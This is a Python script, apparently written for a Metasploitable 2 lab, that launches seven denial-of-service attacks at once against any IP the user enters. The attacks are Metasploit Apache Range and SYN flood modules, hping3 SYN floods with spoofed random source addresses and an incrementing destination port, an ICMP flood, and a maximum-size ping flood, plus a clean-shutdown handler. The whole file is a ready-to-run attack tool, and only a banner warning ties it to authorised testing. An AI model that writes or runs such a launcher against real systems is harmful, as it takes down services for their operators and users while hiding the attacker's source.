#!/usr/bin/env python3
"""
Multi-Vector DoS Launcher — Metasploitable 2 Lab
Authorized penetration testing use only.
Launches parallel DoS attacks via MSF, hping3, and ping.
Includes port-incrementing SYN flood: hping3 -S --flood -p ++1 <ip>
Ctrl+C stops ALL attacks and exits cleanly.
"""

import os
import sys
import time
import subprocess
import threading
import signal
import atexit

# ─── Color helpers ───
class Color:
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    CYAN = "\033[96m"
    RESET = "\033[0m"

def info(msg):
    print(f"{Color.CYAN}[*]{Color.RESET} {msg}")

def ok(msg):
    print(f"{Color.GREEN}[+]{Color.RESET} {msg}")

def warn(msg):
    print(f"{Color.YELLOW}[!]{Color.RESET} {msg}")

def err(msg):
    print(f"{Color.RED}[-]{Color.RESET} {msg}")


# ─── Global state ───
running = True
process_list = []
process_lock = threading.Lock()
cleanup_done = False
cleanup_lock = threading.Lock()


def register_process(proc):
    with process_lock:
        process_list.append(proc)


def kill_process(proc):
    if proc is None or proc.poll() is not None:
        return
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    except (ProcessLookupError, PermissionError, OSError):
        try:
            proc.kill()
        except Exception:
            pass
    try:
        proc.wait(timeout=2)
    except Exception:
        pass


def kill_all_attacks():
    """Stop every attack process and exit cleanly. Safe to call multiple times."""
    global cleanup_done, running

    with cleanup_lock:
        if cleanup_done:
            return
        cleanup_done = True
        running = False

    warn("Ctrl+C detected — stopping ALL DoS tasks...")

    with process_lock:
        procs = list(process_list)

    for proc in procs:
        kill_process(proc)

    cleanup_cmds = [
        "pkill -9 -f msfconsole 2>/dev/null",
        "pkill -9 -f 'auxiliary/dos' 2>/dev/null",
        "pkill -9 -f hping3 2>/dev/null",
        "pkill -9 -f 'ping -f' 2>/dev/null",
        "pkill -9 -f 'ping -s 65507' 2>/dev/null",
    ]
    for cmd in cleanup_cmds:
        try:
            subprocess.call(
                cmd, shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception:
            pass

    time.sleep(0.5)
    ok("All DoS tasks stopped.")
    ok("Exiting cleanly.")


def run_cmd(cmd, label):
    global running
    proc = None
    try:
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid,
        )
        register_process(proc)

        while running and proc.poll() is None:
            time.sleep(0.3)

        if not running and proc.poll() is None:
            kill_process(proc)

    except Exception as e:
        if running:
            err(f"{label} error: {e}")
    finally:
        if proc is not None and proc.poll() is None:
            kill_process(proc)


# ─── Individual attacks ───

def attack_apache_range_dos(target_ip):
    info("Starting Apache Range DoS (MSF) ...")
    cmd = (
        f'msfconsole -q -x "use auxiliary/dos/http/apache_range_dos; '
        f'set RHOSTS {target_ip}; '
        f'set RPORT 80; '
        f'set THREADS 50; '
        f'set TIMEOUT 300; '
        f'run; exit -y"'
    )
    run_cmd(cmd, "apache_range_dos")


def attack_synflood_msf(target_ip):
    info("Starting SYN Flood (MSF) ...")
    cmd = (
        f'msfconsole -q -x "use auxiliary/dos/tcp/synflood; '
        f'set RHOSTS {target_ip}; '
        f'set RPORT 80; '
        f'set NUM 99999999; '
        f'set INTERFACE eth0; '
        f'run; exit -y"'
    )
    run_cmd(cmd, "synflood_msf")


def attack_synflood_hping_80(target_ip):
    info("Starting SYN Flood port 80 (hping3) ...")
    cmd = f"hping3 -S --flood --rand-source -p 80 {target_ip}"
    run_cmd(cmd, "synflood_hping_80")


def attack_synflood_hping_ssh(target_ip):
    info("Starting SYN Flood port 22 (hping3) ...")
    cmd = f"hping3 -S --flood --rand-source -p 22 {target_ip}"
    run_cmd(cmd, "synflood_hping_ssh")


def attack_synflood_hping_port_scan(target_ip):
    """
    Multi-port SYN flood.
    -p ++1  = destination port starts at 1 and increments +1 on EVERY packet sent.
    So the flood sprays across ports 1,2,3,... instead of one fixed port.
    """
    info("Starting multi-port SYN Flood hping3 -S --flood -p ++1 ...")
    cmd = f"hping3 -S --flood -p ++1 {target_ip}"
    run_cmd(cmd, "synflood_hping_port_incr")


def attack_icmp_flood(target_ip):
    info("Starting ICMP Flood (hping3) ...")
    cmd = f"hping3 -1 --flood {target_ip}"
    run_cmd(cmd, "icmp_flood")


def attack_ping_flood(target_ip):
    info("Starting Ping Flood ...")
    cmd = f"ping -f -s 65507 {target_ip}"
    run_cmd(cmd, "ping_flood")


# ─── Signal / exit handlers ───

def on_signal(signum, frame):
    kill_all_attacks()
    sys.exit(0)


def on_exit():
    kill_all_attacks()


# ─── Main ───

def main():
    global running

    print(f"""
{Color.RED}
╔══════════════════════════════════════════════════╗
║    MULTI-VECTOR DoS LAUNCHER — LAB USE ONLY     ║
║        Metasploitable 2 / Authorized Test        ║
╚══════════════════════════════════════════════════╝
{Color.RESET}
{Color.YELLOW}[!] Only use on systems you own / have written permission to test.{Color.RESET}
{Color.YELLOW}[!] Press Ctrl+C anytime to STOP ALL attacks and exit.{Color.RESET}
""")

    target = input(f"{Color.CYAN}[?]{Color.RESET} Enter target IP address: ").strip()
    if not target:
        err("No IP entered. Exiting.")
        sys.exit(1)

    ok(f"Target set to: {target}")
    warn("Attacks launch in 5 seconds. Press Ctrl+C to abort before start.")
    for i in range(5, 0, -1):
        if not running:
            break
        print(f"  {i}...", flush=True)
        time.sleep(1)

    if not running:
        kill_all_attacks()
        sys.exit(0)

    signal.signal(signal.SIGINT, on_signal)
    signal.signal(signal.SIGTERM, on_signal)
    atexit.register(on_exit)

    threads = [
        threading.Thread(target=attack_apache_range_dos, args=(target,), daemon=True),
        threading.Thread(target=attack_synflood_msf, args=(target,), daemon=True),
        threading.Thread(target=attack_synflood_hping_80, args=(target,), daemon=True),
        threading.Thread(target=attack_synflood_hping_ssh, args=(target,), daemon=True),
        # NEW: multi-port SYN flood  →  hping3 -S --flood -p ++1 <ip>
        threading.Thread(target=attack_synflood_hping_port_scan, args=(target,), daemon=True),
        threading.Thread(target=attack_icmp_flood, args=(target,), daemon=True),
        threading.Thread(target=attack_ping_flood, args=(target,), daemon=True),
    ]

    for t in threads:
        t.start()
        time.sleep(0.5)

    ok(f"All {len(threads)} attack threads launched against {target}")
    print(f"""
{Color.CYAN}Active attack vectors:{Color.RESET}
  1. Apache Range DoS          (msfconsole)
  2. SYN Flood port 80         (msfconsole)
  3. SYN Flood port 80         (hping3 --rand-source)
  4. SYN Flood port 22         (hping3 --rand-source)
  5. Multi-port SYN Flood      (hping3 -S --flood -p ++1)
  6. ICMP Flood                (hping3 -1 --flood)
  7. Ping Flood / PoD          (ping -f -s 65507)
""")
    info("DoS running. Press Ctrl+C to STOP ALL and exit.\n")

    try:
        while running:
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        kill_all_attacks()
        sys.exit(0)


if __name__ == "__main__":
    if os.geteuid() != 0:
        err("Run as root:  sudo python3 dos_launcher.py")
        sys.exit(1)

    signal.signal(signal.SIGINT, on_signal)
    signal.signal(signal.SIGTERM, on_signal)

    main()